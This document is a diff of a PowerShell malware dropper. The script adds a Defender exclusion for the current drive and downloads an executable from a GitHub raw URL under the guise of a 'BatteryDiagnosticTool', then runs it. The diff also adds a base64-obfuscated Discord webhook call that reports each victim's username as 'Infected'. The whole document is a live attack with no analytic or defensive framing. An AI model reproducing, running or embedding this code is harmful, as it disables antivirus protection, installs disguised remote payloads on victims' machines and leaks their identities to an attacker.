@@ -1,1 +1,10 @@
-$currentDrive = (Get-Location | Split-Path -Qualifier); Add-MpPreference -ExclusionPath $currentDrive\; $a='http://raw.githubusercontent.com/MyPrincessAkira/Jarvas/main/Cqqjbi.exe';$d="$($env:TEMP)\BatteryDiagnostic";if(-not(Test-Path -Path $d -PathType Container)){New-Item -ItemType Directory -Path $d};Start-Sleep -Seconds 30;Invoke-WebRequest -Uri $a -OutFile "$d\BatteryDiagnosticTool.exe"; Invoke-Item "$d\BatteryDiagnosticTool.exe"
+$currentDrive = (Get-Location | Split-Path -Qualifier)
+Add-MpPreference -ExclusionPath $currentDrive\
+$a='http://raw.githubusercontent.com/MyPrincessAkira/Jarvas/main/Cqqjbi.exe'
+$d="$($env:TEMP)\BatteryDiagnostic"
+if(-not(Test-Path -Path $d -PathType Container)){New-Item -ItemType Directory -Path $d}
+Start-Sleep -Seconds 30;Invoke-WebRequest -Uri $a -OutFile "$d\BatteryDiagnosticTool.exe"
+Invoke-Item "$d\BatteryDiagnosticTool.exe"
+
+$decodedUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNzAzMDU3MjA2MTQyOTgxMC9ZQ2J3U29YM1JTbVAyRkNnTEpUR0dPN3FpaERFRUR6dzRmYzNSeXQ1bkY1STEtRVZXWUlRRTlld05QNDg5LTA4a1Vjdw=="))
+Invoke-RestMethod -Uri $decodedUrl -Method Post -Body (@{content=":sewing_needle: **Infected:** $($env:USERNAME)"})
